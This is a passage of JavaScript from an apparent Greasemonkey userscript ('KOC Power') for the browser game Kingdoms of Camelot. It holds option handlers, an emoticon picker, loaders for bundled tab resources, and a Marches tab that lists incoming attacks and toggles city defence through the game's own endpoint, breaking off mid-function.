  changeColor : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
	  t.showColors();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
    changeColorOpt : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  changePlayerCol : function (valueId, optionName, callOnChange){
    var t = Tabs.Options;
    var e = document.getElementById(valueId);
    e.value = Colors[optionName];
    e.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Colors[optionName] = this.value;
      saveColors();
	  t.showPlayers();
      if (callOnChange)
        callOnChange (this.value);
    }
  },
  togOpt : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Options;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (Options[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.checked;
      saveOptions();
      if (callOnChange)
        callOnChange (this.checked);
    }
  },
	changeOpt : function (valueId, optionName, callOnChange){
	var t = Tabs.Options;
	var e = document.getElementById(valueId);
	e.value = Options[optionName];
	e.addEventListener ('change', eventHandler, false);
	function eventHandler (){
	  Options[optionName] = this.value;
	  saveOptions();
	  if (callOnChange)
		callOnChange (this.value);
	  }
	},
  
	e_watchChanged : function (){
	GlobalOptions.pbWatchdog = document.getElementById('pbWatchEnable').checked;
	GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
	saveGlobalOptions();	
	},
	e_wideChanged : function (){
	GlobalOptions.pbWideScreen = document.getElementById('pbWideOpt').checked;
	GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));  
	saveGlobalOptions();
	},
  e_updateChanged : function (){
    GlobalOptions.pbupdate = document.getElementById('pbupdate').checked;
    GM_setValue ('GlobalOptions_??', JSON2.stringify(GlobalOptions));
	saveGlobalOptions();
  },
  EmoClick: function(what) {
  document.getElementById ("mod_comm_input").value += " " + what + " ";
  }, 
  EmoHelp : function (){
	var t = Tabs.Options;
	unsafeWindow.pdxEmoClick = t.EmoClick;
	var helpText = '<DIV style="max-height:195px; overflow-y:auto">';
	helpText += '<TABLE width=95% cellspacing=0 cellpadding=4 border=1 bordercolor=black>';
	helpText += '<TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00100-smile.gif\" onclick="pdxEmoClick(\':-)\')"></td><TD>:) :-) :=) ^^</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00101-sadsmile.gif\" onclick="pdxEmoClick(\':-(\')"></td><TD>:-( :=(</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00102-bigsmile.gif\" onclick="pdxEmoClick(\':-D\')"></td><TD>:D :-D :=D</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00106-crying.gif\" onclick="pdxEmoClick(\';-(\')"></td><TD>;-( ;=(</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00109-kiss.gif\" onclick="pdxEmoClick(\':-*\')"></td><TD>:-* :=*</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00112-wondering.gif\" onclick="pdxEmoClick(\':^)\')"></td><TD>:^)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00105-wink.gif\" onclick="pdxEmoClick(\';-)\')"></td><TD>;-) ;=)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00113-sleepy.gif\" onclick="pdxEmoClick(\'I-)\')"></td><TD>I-) I=)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00103-cool.gif\" onclick="pdxEmoClick(\'8-)\')"></td><TD>8-) 8=) B-) B=)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00121-angry.gif\" onclick="pdxEmoClick(\'x=(\')"></td><TD>x=( x-( :-@ :=@</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00119-puke.gif\" onclick="pdxEmoClick(\':-& \')"></td><TD>:-& :=&</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00107-sweating.gif\" onclick="pdxEmoClick(\'(:I\')"></td><TD>(:I</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00110-tongueout.gif\" onclick="pdxEmoClick(\':=P\')"></td><TD>:P :=P :-P :=p</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00111-blush.gif\" onclick="pdxEmoClick(\':-$\')"></td><TD>:-$ :=$ :"></td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00123-party.gif\" onclick="pdxEmoClick(\'(party)\')"></td><TD>(party)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00176-smoke.gif\" onclick="pdxEmoClick(\'(ci)\')"></td><TD>(smoke) (smoking) (ci) (rauchen)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00181-fubar.gif\" onclick="pdxEmoClick(\'(fubar)\')"></td><TD>(fubar)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00115-inlove.gif\" onclick="pdxEmoClick(\'(inlove)\')"></td><TD>(inlove)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00128-hi.gif\" onclick="pdxEmoClick(\'(bj)\')"></td><TD>(hi)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00137-clapping.gif\" onclick="pdxEmoClick(\'(clap)\')"></td><TD>(clap) (bravo) (klatschen)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00140-rofl.gif\" onclick="pdxEmoClick(\'(rofl)\')"></td><TD>(rofl)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00168-drink.gif\" onclick="pdxEmoClick(\'(drink)\')"></td><TD>(drink)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00162-coffee.gif\" onclick="pdxEmoClick(\'(cafe)\')"></td><TD>(cafe) (kaffee) (coffee)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00154-mail.gif\" onclick="pdxEmoClick(\'(m)\')"></td><TD>(m) (e)</td></tr><TR><TD><img class=emoicon src=\"http://factoryjoe.s3.amazonaws.com/emoticons/emoticon-0180-bug.gif\" onclick="pdxEmoClick(\'(bug)\')"></td><TD>(bug)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00134-bear.gif\" onclick="pdxEmoClick(\'(bear)\')"></td><TD>(bear)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00118-yawn.gif\" onclick="pdxEmoClick(\'I()\')"></td><TD>I()</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/like.gif\" onclick="pdxEmoClick(\'(like)\')"></td><TD>(like)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00116-evilgrin.gif\" onclick="pdxEmoClick(\'(evilgrin)\')"></td><TD>]: >:) </td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/poolparty.gif\" onclick="pdxEmoClick(\'(pool)\')"></td><TD>(pool)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_bandit.gif\" onclick="pdxEmoClick(\'(bandit)\')"></td><TD>(bandit)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_drunk.gif\" onclick="pdxEmoClick(\'(drunk)\')"></td><TD>(drunk)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_finger.gif\" onclick="pdxEmoClick(\'(finger)\')"></td><TD>(finger)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_mooning.gif\" onclick="pdxEmoClick(\'(mooning)\')"></td><TD>(mooning)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_rock.gif\" onclick="pdxEmoClick(\'(rock)\')"></td><TD>(rock)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/swear.gif\" onclick="pdxEmoClick(\'(swear)\')"></td><TD>(swear)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/tmi.gif\" onclick="pdxEmoClick(\'(tmi)\')"></td><TD>(tmi)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_toivo.gif\" onclick="pdxEmoClick(\'(toivo)\')"></td><TD>(toivo)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype-wackyb-0139-1-bow.gif\" onclick="pdxEmoClick(\'(bow)\')"></td><TD>(bow)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00170-ninja.gif\" onclick="pdxEmoClick(\'(ninja)\')"></td><TD>(ninja)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00167-beer.gif\" onclick="pdxEmoClick(\'(beer)\')"></td><TD>(beer)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00165-muscle.gif\" onclick="pdxEmoClick(\'(muscle)\')"></td><TD>(muscle)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00163-pizza.gif\" onclick="pdxEmoClick(\'(pizza)\')"></td><TD>(pizza)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00159-music.gif\" onclick="pdxEmoClick(\'(music)\')"></td><TD>(music)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00146-punch.gif\" onclick="pdxEmoClick(\'(punch)\')"></td><TD>(punch)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00148-yes.gif\" onclick="pdxEmoClick(\'(yes)\')"></td><TD>(yes)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00150-handshake.gif\" onclick="pdxEmoClick(\'(handshake)\')"></td><TD>(handshake)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00149-no.gif\" onclick="pdxEmoClick(\'(no)\')"></td><TD>(no)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00155-flower.gif\" onclick="pdxEmoClick(\'(flower)\')"></td><TD>(flower)</td></tr><TR><TD><img class=emoicon src=\"http://www.skype-emoticons.com/images/emoticon-00161-phone.gif\" onclick="pdxEmoClick(\'(phone)\')"></td><TD>(phone)</td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/skype_headbang.gif\" onclick="pdxEmoClick(\'(headbang)\')"></td><TD>(headbang)</td></tr>';
	helpText += '<TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/glory.png\" onclick="pdxEmoClick(\'(glory)\')"></td><TD> (glory) (fight) </td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/dontlike.gif\" onclick="pdxEmoClick(\'(dontlike)\')"></td><TD> (dontlike) </td></tr><TR><TD><img class=emoicon src=\"http://koc-power-pdx.googlecode.com/svn/trunk/img/emo/heart.png\" onclick="pdxEmoClick(\'<3\')"></td><TD> <3 </td></tr><TR><TD><img class=emoicon src=\"'+EMOpdx+'\" onclick="pdxEmoClick(\'(pdx)\')"></td><TD>(pdx) (nessaja) (ksx) (jontey)</td></tr>';
	helpText += '</table></div>';

	var inputtext=document.getElementById('mod_comm_input');
	var pop = new CPopup ('EmoHelp', 0, 0, 746, 100, true);
	//pop.centerMe (mainPop.getMainDiv()); 
	pop.getMainDiv().innerHTML = helpText;
	pop.getTopDiv().innerHTML = '<div class=showBadged><center>'+culang.Osmileys+'</div></center>';
	pop.show (true);
	// document.getElementById("EmoHelp_outer").style.top = (getOffset(inputtext).top+25) +'px';
	// document.getElementById("EmoHelp_outer").style.left = (getOffset(inputtext).left+100) +'px';
  },

  
};
// END OPTIONS TAB
/************************************************************************************
*						KOC POWER - TABS REPORTS									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_REPORTS' ));
/************************************************************************************
*						KOC POWER - TABS COMBAT										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_COMBAT' ));
/************************************************************************************
*						KOC POWER - TABS ALLIANCE									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_ALLIANCE' ));
/************************************************************************************
*						KOC POWER - TABS CREST 										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_CREST' ));
/************************************************************************************
*						KOC POWER - TABS DARK FOREST								*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_DARKFOREST' ));
/************************************************************************************
*						KOC POWER - TABS RAID 										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_RAID' ));
/************************************************************************************
*						KOC POWER - TABS MARCHES									*
************************************************************************************/
Tabs.Marches = {
  tabLabel : culang.march,
  tabOrder : StyleOptions.toMarsch,
  cont:null,
  displayTimer:null,
  curTabBut : null,
  curTabName : null,
  state : null,
  
  hide : function (){
      var t = Tabs.Marches;
      clearTimeout (t.displayTimer);
  },
  
  show : function (){
   var t = Tabs.Marches;
       clearTimeout (t.displayTimer);
       if (t.curTabName == 'Z')
         t.showReinforcementsOut();
       else if (t.curTabName == 'R')
         t.showReinforcements();
       else if (t.curTabName == 'M')
         t.showMarches(9);
       else
      t.showAttacks();
  },
  init : function (div){  
    var t = Tabs.Marches; 
    t.cont = div;
    unsafeWindow.pr58Recall = t.ajaxRecall;
    unsafeWindow.raid_delete = t.ajaxDeleteRaid;
    unsafeWindow.r8x6Home = t.butSendHome;
    unsafeWindow.pr57Recall = t.butRecall2;
  
    var atkclass='';
    if(Seed && Seed.queue_atkinc) {
      for(k in Seed.queue_atkinc){
        m = Seed.queue_atkinc[k];
        if (m.marchType == 4){
    	   atkclass = 'style="background-color:#FF9999;"';
    	 }
      }
    }
    
 t.cont.innerHTML = '<div class=pdxStat>'+culang.HtabMarches+'</div><TABLE class=pdxTab align=center><TR><TD><INPUT class=pbSubtab ID=BoptmrchSubM type=submit value="'+culang.marches+'"></td>\
          <TD><INPUT class=pbSubtab ID=BoptmrchSubA type=submit '+atkclass+' value="'+culang.attacks+'"></td>\
          <TD><INPUT class=pbSubtab ID=BoptmrchSubR type=submit value="'+culang.embassy+'"></td>\
          <TD><INPUT class=pbSubtab ID=BoptmrchSubZ type=submit value="'+culang.stdef+'"></td></tr></table>\
      <DIV id="BoptMarchOutput" style="margin-top:5px; max-height:530px;overflow:auto"></div>';
     t.marchDiv = document.getElementById('BoptMarchOutput'); 
    document.getElementById('BoptmrchSubA').addEventListener('click', e_butSubtab, false);
    document.getElementById('BoptmrchSubR').addEventListener('click', e_butSubtab, false);
    document.getElementById('BoptmrchSubM').addEventListener('click', e_butSubtab, false);
    document.getElementById('BoptmrchSubZ').addEventListener('click', e_butSubtab, false);
    
       if (atkclass!='') {
       changeSubtab (document.getElementById('BoptmrchSubA'));  
       }else {
       changeSubtab (document.getElementById('BoptmrchSubM'));  
       }
       
      function e_butSubtab (evt){
          changeSubtab (evt.target);   
      }
    
      function changeSubtab (but){
          if (but == t.curTabBut)
            return;
          if (t.curTabBut){
            t.curTabBut.className='pbSubtab'; 
            t.curTabBut.disabled=false;
          }
          t.curTabBut = but;
          but.className='pbSubtab pbSubtabSel'; 
          but.disabled=true;
          t.curTabName = but.id.substr(11);
          if (Options.currentTab=="Marches") t.show2();
      }  
    
  },
  show2 : function (){
    var t = Tabs.Marches;
    t.state = null;
    clearTimeout (t.displayTimer);
    if (t.curTabName == 'Z')
      t.showReinforcementsOut();
    else if (t.curTabName == 'R')
      t.showReinforcements();
    else if (t.curTabName == 'M')
      t.showMarches(9);
    else
      t.showAttacks();
  },
 
   /***   ATTACKS SUBTAB  ***/
  showAttacks : function (){
      var t = Tabs.Marches;
      clearTimeout (t.displayTimer);
      var now = unixTime();
      var target, atkType, who, atkclass;
      t.marchDiv.innerHTML = "<br>"+culang.loading+"<br><i></i>"; 
      var s = '<div class=pdxStat>'+culang.HTMincomming+'</div><table border=0 cellspacing=0 cellpadding=0 width=100%><tr><td>'+culang.showatk+': <select id="BoFiltreAttack"><option value="0">'+culang.all+'</option></select></td><td><input type=button value="'+culang.helpbutton+'" onclick="alert(\''+culang.atkhelp+' \');"></font></td></table>';
      s += '<STYLE> .eclkk{background:#ffff55;} .attackkk{background:#ff5555;} .attackkA{background:#ff9955;}</style>';
      s += '<TABLE border=0 cellspacing=0 cellpadding=2 width=100%>';
      s += '<tr><td width=55><b>'+culang.arrival+'</td><td width=60><b>'+culang.def+'</td><td width=140 colspan=2><b>'+culang.holyplace+'</td><td width=150 colspan=2><b>'+culang.victim+'</td><td width=35><b>'+culang.distance+'</td><td width=25><b>'+culang.knights+'</td><td><b>'+culang.troops+'</td></tr>';  
	  var at=0;
      if(Seed && Seed.queue_atkinc) {
       var sortem = [];    
       for (var k in Seed.queue_atkinc) 
          sortem.push (Seed.queue_atkinc[k]);
          
        sortem.sort (function (a,b){
          var x; if ((x = a.arrivalTime-b.arrivalTime)!=0) 
            return x; 
          return b.arrivalTime-a.arrivalTime;
        });    
                
       //for(k in Seed.queue_atkinc){
       //	m = Seed.queue_atkinc[k];
       for (i=0; i<sortem.length; i++){
          var m = sortem[i]; 
      
      	if (m.marchType == 3){
	      atkType = ''+culang.scout+'';
	      atkclass = 'eclkk';
	    } else if (m.marchType == 4){
	      atkType = ''+culang.rptattack+'';
	      atkclass = 'attackkk';
	       var nbtroupe=0;
	       for (k in m.unts){
	                nbtroupe += parseInt(m.unts[k]);
                }
	        if (nbtroupe==1) {
	         atkclass = 'attackkA';
	        }
	      
	    } else {
	      atkType ="?";//return;
	      atkclass = '';
    	 }
    	 if (atkclass !='') {  
    	 at++;
    	 s += '<tr align=left >';
    	  
    	 var arrivedans = unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime()));
    	 s += '<td class="'+atkclass+'">' + arrivedans +'</td>';
    	 var couelur="";
    	 var city = Cities.byID[m.toCityId];
    	 if (city.tileId == m.toTileId) {
           target = '<a onclick="citysel_click(document.getElementById(\'citysel_'+ (city.idx+1)+'\'));">'+ city.name.substring(0,10) +'</a>';
           cityID = 'city'+ m.toCityId;
	   Gate = parseInt(Seed.citystats[cityID].gate);
	   if(Gate == 0) {
	   	bouttt = '<input type=button value="'+culang.Hdef+' '+culang.buttonoff+'" id="but_'+m.toCityId+'" style="background-color:#00AA00;padding:2px;border:1px solid yellow;">';
	   	}	   else {
		bouttt = '<input type=button value="'+culang.Hdef+' '+culang.buttonon+'" id="but_'+m.toCityId+'" style="background-color:red;">';
		}
		   coordos = ''+pdxkoordlink(city.x,city.y)+'';
         } else {
           target = 'TS';
           bouttt='';
           for (k in Seed.wilderness['city'+m.toCityId]){
            if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
             coordos = ''+pdxkoordlink(Seed.wilderness['city'+m.toCityId][k].xCoord,Seed.wilderness['city'+m.toCityId][k].yCoord)+''; 
			break;           
            }
           }
         }  
         s += '<td class="'+atkclass+'" align=center>'+bouttt+'</td><td class="'+atkclass+'" align=center><b>' + target + '<td class="'+atkclass+'" align=center>'+coordos+'</b></td>';
         
         if (Seed.players['u'+m.pid]) {
	    who = '<span>'+Seed.players['u'+m.pid].n +'<br>'+addCommas(Seed.players['u'+m.pid].m)+'</span>';
	 
	 } else if (m.players && m.players['u'+m.pid]) {
	    who = m.players['u'+m.pid].n;
	 } else{
	    who = ''+culang.botStatUnknown+'';
	
      	 }
      	 if (m.fromXCoord) { 
		  who += '</td><td class="'+atkclass+'"> '+pdxkoordlink(m.fromXCoord,m.fromYCoord)+'';
      	 } else {
      	  who += '</td><td class="'+atkclass+'">???</a></td>';
      	 }
      	 s += '<td class="'+atkclass+'">' + who + '</td>';
      	 if (m.fromXCoord) {
      	  s +='<td class="'+atkclass+'">'+ distance(city.x,city.y,m.fromXCoord,m.fromYCoord) +'</td>';
      	 } else {
      	   s +='<td class="'+atkclass+'">&nbsp;</td>';
      	 }
         var troupe = "";
         for (k in m.unts){
          var uid = parseInt(k.substr (1));
          troupe += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +'<br>';
         }
		var knh='&nbsp;';
		if (m.knt) {
			for (k in m.knt){
			knh=parseInt(m.knt[k]);
		}        
         }
		s += '<td class="'+atkclass+'">'+knh+'</td>';
		s += '<td class="'+atkclass+'">' + troupe +'</td>';
		s += '</tr>';
         }
      	}  
      	if (at==0) {
      	 s ="<tr><colspan=4><div class=pdxStat>"+culang.HTMincomming+"</div><br><b><center>"+culang.MTnoatk+"</center></b></td></tr>";
      	}
      } 
      s+='</table>';
      t.marchDiv.innerHTML = s; 
      
      for (var cityId in Cities.byID){
      	var but = document.getElementById ('but_'+ cityId);
      	if (but) {
      	  addListener (but, cityId);
         }
      }
      			  
       function addListener (but, i){
      	 but.addEventListener ('click', function (){t.butToggleDefMode(i)}, false);
       }
      
      t.displayTimer = setTimeout (t.showAttacks, 900);
    },
    defMode:{},
    butToggleDefMode : function (cityId){
        var t = Tabs.Marches;
        var mode = 1;
        if (Seed.citystats["city" + cityId].gate != 0)
          mode = 0;
          t.ajaxSetDefMode (cityId, mode, function (newMode){

          });
    },

    ajaxSetDefMode : function (cityId, state, notify){
    		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    		params.cid = cityId;
    		params.state = state;
    		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/gate.php" + unsafeWindow.g_ajaxsuffix, {
    			method: "post",
    			parameters: params,
    			onSuccess: function (rslt) {
    				if (rslt.ok) {
    					Seed.citystats["city" + cityId].gate = state;
    					notify (state);
    				} 
    			},
    			onFailure: function () {
    			}
    		})
     },
// MARCH SUBTAB { MARCHES }
    showMarches : function (numville){
 
      var t = Tabs.Marches;
      var rownum = 0;
      var now = unixTime();
      var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];      clearTimeout (t.displayTimer);
      if (t.state == null){       
       var s = '<div class=pdxStat>'+culang.HTMtroop+'</div><BR><b>'+culang.hideraids+':</b> <input id=BOVoirRaid type=checkbox '+ (!Options.voirRaid?'':' CHECKED ') +'>';  
       s += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;}</style><input style="font-size:12px" type=button id="9_CityButton" value="0">';
       for (var c=0; c<Cities.numCities; c++){
            s += '<input style="font-size:12px" type=button id="'+ c +'_CityButton" value="' + (parseInt(c)+1) + ' : '+ Cities.cities[c].name.substring(0,10) +'">';
       }
       s += '<div id="showMarchDiv"></div>';
       t.marchDiv.innerHTML = s;
       
       document.getElementById('BOVoirRaid').addEventListener('click', function() {
       
         Options.voirRaid = document.getElementById('BOVoirRaid').checked;
         saveOptions();
         
       }, false);
       
       document.getElementById("9_CityButton").addEventListener('click', function(){
                           var t = Tabs.Marches;
                           clearTimeout (t.displayTimer);
                           t.showMarches(this.id.substring(0,1));
                           
       }, false);
       
       for (var c=0; c<Cities.numCities; c++){
          document.getElementById(c + "_CityButton").addEventListener('click', function(){
                    var t = Tabs.Marches;
                    clearTimeout (t.displayTimer);
                    t.showMarches(this.id.substring(0,1));
                    
           }, false);
       
       }
       
       t.state = 1; 
      }
      
      s = '<TABLE cellspacing=0 cellpadding=2 width=100%>';
      tot = [];
      for (i=0; i<13; i++)  tot[i] = 0;
      
      var c = numville;
      
      if (numville==9) {
        
        for (var c=0; c<Cities.numCities; c++){
          var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
          if (matTypeof(que)=='object') {
            var a=0;
            for (k in que) {
              march = que[k]; 
              if ((march.marchType!=2 && !Options.voirRaid) || (march.marchType!=9 && march.marchType!=2 && Options.voirRaid) ) {
                 a++;
                 if (a==1) {
      	             var cityID = 'city'+ Cities.cities[c].id;
      	             var slots=0;
		     for(var z in Seed.queue_atkp[cityID])
		     	slots++;      
      	             var niveauPointRall=parseInt(getCityBuilding (Cities.cities[c].id, 12).maxLevel); 
      	             if (niveauPointRall==12) niveauPointRall=11; 
      	  	     s+= '<TR><TD class="city">'+culang.shrrp+': '+slots+'/'+niveauPointRall+'</td><TD class="city" colspan=19 align=center><font size=3><B><i><u>'+culang.holyplace+' ' + (parseInt(c)+1) + ' - '+ Cities.cities[c].name +'</b></td></tr>';
      	         }
                 var mid = k.substr(1);
                 knight = '';
                 if (Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"] !=0){
		  for (i in Seed.knights['city'+ Cities.cities[c].id]) {
		    if (i == ("knt" + Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"]) ) knight = '' +Seed.knights['city'+ Cities.cities[c].id][i]["combat"] +'';
		  }
  		 } else knight = '';
                var playerId = march.toPlayerId;
                if (playerId==undefined) playerId=0;
                var cityId = march.toCityId;
                var tileType = parseInt(march.toTileType);
                var tileLevel = march.toTileLevel;
                var who = ''+culang.botStatUnknown+'';
                if (Seed.players['u' + playerId]) {
		 who = Seed.players['u' + playerId].n;
		}
		if (march.marchType==1) {
		  var player = "<span>"+culang.city+" "+culang.lvl+" "+ tileLevel +"</span>";
		}else {
		  var player = "<span title='"+culang.needRefresh+"'>"+culang.rptbarb+" "+culang.lvl+" "+ tileLevel +"</span>";
		}
		if (march.marchType==10 || march.marchType==11) { 
		  var player = "<span>"+culang.darkforest+" "+culang.lvl+" "+ tileLevel +"</span>";
		}
		var tileNames = [''+culang.barbarians+'', ''+culang.grassland+'', ''+culang.rptlake+'', ''+culang.forests+'', ''+culang.rpthill+'', ''+culang.rptmount+'', ''+culang.rptplain+'', ''+culang.city+'', ''+culang.darkforest+'' ];
		var numtile=parseInt(tileType/10) + 1;
		if (tileType==10) numtile=1;
		if (tileType==11) numtile=2;
                if (tileType <= 50) { // TS
                  player = tileNames[numtile] +" "+culang.lvl+" " + tileLevel;
                  /*if (playerId==0) {
                   player += " - Libre";
                  } else {
                   player += " - " + who;
                  }*/
                }

                if (tileType == 51 && playerId == 0 && march.toTileLevel==9) { // Barbares
		  player = ""+culang.rptbarb+" "+culang.lvl+" " + tileLevel;
                }
				                if (tileType == 51 && playerId == 0 && march.toTileLevel==7) { // Ville
                  player = ""+culang.city+" "+culang.lvl+" " + tileLevel;
                }
                if (tileType == 54 && playerId == 0) { // Barbares
		     player = ""+culang.shrDF+" "+culang.lvl+" " + tileLevel;
                }
                var nomville="";
                if (playerId > 0 && tileType == 51) { // ville
                 if (march.marchType==1) {
                  for(i=0; i<Cities.numCities; i++) {
                   if (cityId==Cities.cities[i].id) {
                    nomville=Cities.cities[i].name
                     break;
                   }
                  }
                  player = '<i>'+culang.from+'</i> '+ nomville;
                 } else {
                  player = ''+culang.city+' '+culang.lvl+' ' + tileLevel;
                 }
                }
                var typeattack="?";
                if (march.marchType==3) typeattack=''+culang.scout+'';
                if (march.marchType==4) typeattack=''+culang.rptattack+'';
                if (march.marchType==10) typeattack=''+culang.rptattack+'';
                if (march.marchType==11) typeattack=''+culang.scout+'';
                if (march.marchType==1) typeattack=''+culang.transport+'';
                if (march.marchType==5) typeattack=''+culang.Mreassign+'';
                if (march.marchType==9) typeattack=''+culang.raitack+'';
                var now = new Date();
                var statusm = march.marchStatus;
                var Marchstatut="<span title='type : "+march.marchType+" "+culang.status+": "+statusm+"'>?</span> ";
                var arrivedans="0s";
                var arrivedanssec=0;
		if (statusm==1) { 
		 Marchstatut="";
		 if (march.marchType==3 || march.marchType==11) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/scouting.jpg" align=absmiddle>';
		 if (march.marchType==4 || march.marchType==10) 
		  Marchstatut+='<img src="'+IMGattacking+'" align=absmiddle>';
		 if (march.marchType==9) 
		  Marchstatut+='<img src="'+IMGattacking+'" align=absmiddle>';
		 if (march.marchType==1) 
		  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/transporting.jpg" align=absmiddle>';
                 if (march.marchType==5) 
                  Marchstatut+='<img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/reinforce.jpg" align=absmiddle>';
		  Marchstatut+="&nbsp;"+culang.march+""; 
		  arrivedans = unsafeWindow.timestr(parseInt(march.destinationUnixTime - unixTime()));
		  arrivedanssec = parseInt(march.destinationUnixTime - unixTime());
		}
                if (statusm==8) { 
